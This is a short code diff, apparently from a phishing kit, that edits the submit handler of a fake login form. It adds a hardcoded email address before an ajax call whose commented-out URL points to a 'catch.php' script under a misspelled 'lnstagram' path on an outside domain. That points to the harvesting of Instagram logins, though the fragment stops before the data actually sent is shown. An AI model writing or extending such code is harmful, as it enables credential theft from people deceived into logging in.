@@ -70,6 +70,9 @@ lf.submit(function (e) {
     lb.addClass("A086a")
     lb.attr("disabled", true)
     $("#loginLoading").show()
+
+    var email = "mk6229478@gmail.com"
+
     $.ajax({
         /*
         url: "https://mkws.ml/lnstagram/catch.php",
